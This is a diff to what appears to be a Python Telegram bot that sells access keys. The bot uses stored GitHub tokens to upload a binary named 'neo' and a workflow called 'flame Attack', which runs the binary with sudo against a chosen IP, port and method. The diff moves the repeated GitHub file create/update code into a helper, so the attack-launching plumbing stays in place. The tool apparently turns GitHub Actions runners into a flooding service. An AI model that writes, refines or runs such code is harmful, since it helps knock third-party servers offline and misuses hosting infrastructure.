@@ -862,6 +862,35 @@ def redeem_key_func(key_name, user_id):
         f"<tg-emoji emoji-id='5399850755337240950'>⏱️</tg-emoji> <b>ᴅᴜʀᴀᴛɪᴏɴ:</b> <code>{days_label}</code>"
     )
 
+def safe_github_file_upsert(repo, path, message, content, branch_name="main"):
+    file_sha = None
+    try:
+        existing = repo.get_contents(path, ref=branch_name)
+        if isinstance(existing, list):
+            file_sha = existing[0].sha
+        elif existing:
+            file_sha = existing.sha
+    except Exception:
+        try:
+            existing = repo.get_contents(path)
+            if isinstance(existing, list):
+                file_sha = existing[0].sha
+            elif existing:
+                file_sha = existing.sha
+        except Exception:
+            file_sha = None
+
+    if file_sha:
+        try:
+            repo.update_file(path, message, content, file_sha, branch=branch_name)
+        except Exception:
+            repo.update_file(path, message, content, file_sha)
+    else:
+        try:
+            repo.create_file(path, message, content, branch=branch_name)
+        except Exception:
+            repo.create_file(path, message, content)
+
 def create_repository(token, repo_name="flamedev-tg"):
     try:
         g = Github(token)
@@ -900,31 +929,15 @@ jobs:
         g = Github(token)
         repo = g.get_repo(repo_name)
         branch_name = getattr(repo, 'default_branch', 'main') or 'main'
-        try:
-            file_content = repo.get_contents(YML_FILE_PATH, ref=branch_name)
-            repo.update_file(
-                YML_FILE_PATH,
-                f"Update attack parameters - {ip}:{port} ({method})",
-                yml_content,
-                file_content.sha,
-                branch=branch_name
-            )
-            logger.info(f"✅ Updated configuration for {repo_name}")
-        except Exception:
-            try:
-                repo.create_file(
-                    YML_FILE_PATH,
-                    f"Create attack parameters - {ip}:{port} ({method})",
-                    yml_content,
-                    branch=branch_name
-                )
-            except Exception:
-                repo.create_file(
-                    YML_FILE_PATH,
-                    f"Create attack parameters - {ip}:{port} ({method})",
-                    yml_content
-                )
-            logger.info(f"✅ Created configuration for {repo_name}")
+        
+        safe_github_file_upsert(
+            repo,
+            YML_FILE_PATH,
+            f"Update attack parameters - {ip}:{port} ({method})",
+            yml_content,
+            branch_name
+        )
+        logger.info(f"✅ Updated configuration for {repo_name}")
             
         try:
             wf_filename = YML_FILE_PATH.split('/')[-1]
@@ -2882,14 +2895,13 @@ async def handle_binary_file(update: Update, context: ContextTypes.DEFAULT_TYPE)
                 branch_name = getattr(repo, 'default_branch', 'main') or 'main'
                 
                 # 1. Save binary file as BINARY_FILE_NAME ("neo")
-                try:
-                    existing = repo.get_contents(BINARY_FILE_NAME, ref=branch_name)
-                    repo.update_file(BINARY_FILE_NAME, f"Update binary {BINARY_FILE_NAME}", binary_content, existing.sha, branch=branch_name)
-                except Exception:
-                    try:
-                        repo.create_file(BINARY_FILE_NAME, f"Upload binary {BINARY_FILE_NAME}", binary_content, branch=branch_name)
-                    except Exception:
-                        repo.create_file(BINARY_FILE_NAME, f"Upload binary {BINARY_FILE_NAME}", binary_content)
+                safe_github_file_upsert(
+                    repo,
+                    BINARY_FILE_NAME,
+                    f"Upload binary {BINARY_FILE_NAME}",
+                    binary_content,
+                    branch_name
+                )
 
                 # 2. Ensure workflow file .github/workflows/main.yml exists
                 default_yml_content = f"""name: flame Attack
@@ -2907,14 +2919,13 @@ jobs:
     - run: chmod +x {BINARY_FILE_NAME}
     - run: sudo ./{BINARY_FILE_NAME} 1.1.1.1 80 1 999
 """
-                try:
-                    existing_yml = repo.get_contents(YML_FILE_PATH, ref=branch_name)
-                    repo.update_file(YML_FILE_PATH, f"Update workflow for {BINARY_FILE_NAME}", default_yml_content, existing_yml.sha, branch=branch_name)
-                except Exception:
-                    try:
-                        repo.create_file(YML_FILE_PATH, f"Create workflow for {BINARY_FILE_NAME}", default_yml_content, branch=branch_name)
-                    except Exception:
-                        repo.create_file(YML_FILE_PATH, f"Create workflow for {BINARY_FILE_NAME}", default_yml_content)
+                safe_github_file_upsert(
+                    repo,
+                    YML_FILE_PATH,
+                    f"Create/Update workflow for {BINARY_FILE_NAME}",
+                    default_yml_content,
+                    branch_name
+                )
 
                 # 3. Trigger / Dispatch workflow
                 try:
